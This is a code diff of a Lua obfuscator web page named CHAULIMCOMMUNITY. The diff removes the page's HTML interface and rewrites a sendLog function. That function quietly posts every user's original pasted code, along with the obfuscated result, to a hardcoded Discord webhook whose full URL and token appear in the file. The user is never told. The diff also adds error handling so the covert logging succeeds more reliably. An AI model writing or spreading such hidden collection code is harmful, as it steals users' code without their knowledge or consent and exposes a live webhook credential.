@@ -1,98 +1,14 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<title>CHAULIMCOMMUNITY</title>
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}
-
-body{
-background:linear-gradient(135deg,#0f0f0f,#1a1a1a);
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-color:white;
-}
-
-.container{
-width:850px;
-background:#111;
-border-radius:12px;
-box-shadow:0 0 40px rgba(255,0,60,0.25);
-padding:20px;
-}
-
-h1{
-text-align:center;
-margin-bottom:20px;
-color:#ff003c;
-}
-
-textarea{
-width:100%;
-height:150px;
-background:#1e1e1e;
-border:none;
-color:white;
-padding:10px;
-border-radius:8px;
-margin-bottom:10px;
-resize:none;
-}
-
-.buttons{
-display:flex;
-gap:10px;
-}
-
-button{
-flex:1;
-padding:12px;
-border:none;
-border-radius:8px;
-cursor:pointer;
-font-weight:bold;
-}
-
-.obf{background:#ff003c;}
-.copy{background:#0099ff;}
-.download{background:#00c77a;}
-</style>
-
-</head>
-
-<body>
-
-<div class="container">
-
-<h1>CHAULIMCOMMUNITY</h1>
-
-<textarea id="input" placeholder="Cole seu código Lua..."></textarea>
-
-<div class="buttons">
-<button class="obf" onclick="obfuscate()">OFUSCAR</button>
-<button class="copy" onclick="copyCode()">COPIAR</button>
-<button class="download" onclick="downloadLua()">BAIXAR</button>
-</div>
-
-<textarea id="output" placeholder="Código protegido..."></textarea>
-
-</div>
-
 <script>
 
 /* ================= WEBHOOK ================= */
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G";
 
-function sendLog(original, output){
+async function sendLog(original, output){
 
-fetch(WEBHOOK_URL, {
-method: "POST",
-headers: {"Content-Type":"application/json"},
-body: JSON.stringify({
+try {
+
+const payload = {
 content: "🔥 NOVO CÓDIGO OFUSCADO",
 embeds: [{
 title: "CHAULIMCOMMUNITY LOG",
@@ -100,16 +16,33 @@ color: 16711680,
 fields: [
 {
 name: "📥 Original",
-value: "```" + (original || "").slice(0,1500) + "```"
+value: "```" + String(original).slice(0, 1000) + "```"
 },
 {
 name: "📤 Ofuscado",
-value: "```" + (output || "").slice(0,1500) + "```"
+value: "```" + String(output).slice(0, 1000) + "```"
 }
 ]
 }]
-})
+};
+
+const res = await fetch(WEBHOOK_URL, {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify(payload)
 });
+
+if(!res.ok){
+console.log("❌ Erro webhook:", await res.text());
+} else {
+console.log("✅ Log enviado com sucesso!");
+}
+
+} catch(err){
+console.log("❌ Falha no webhook:", err);
+}
 
 }
 
@@ -217,16 +150,14 @@ local ok,err = pcall(function()
 end)
 
 if not ok then print("CHAULIM ERROR: "..tostring(err)) end
-`
+`;
 
-document.getElementById("output").value = lua
+document.getElementById("output").value = lua;
 
-// LOG DISCORD
+// 🔥 LOG DISCORD (AGORA MAIS ESTÁVEL)
 sendLog(code, lua);
 
 }
-
-/* ================= COPY ================= */
 
 function copyCode(){
 let t = document.getElementById("output").value
@@ -234,8 +165,6 @@ if(!t) return alert("Nada")
 navigator.clipboard.writeText(t)
 alert("Copiado!")
 }
-
-/* ================= DOWNLOAD ================= */
 
 function downloadLua(){
 let t = document.getElementById("output").value
@@ -249,6 +178,3 @@ a.click()
 }
 
 </script>
-
-</body>
-</html>
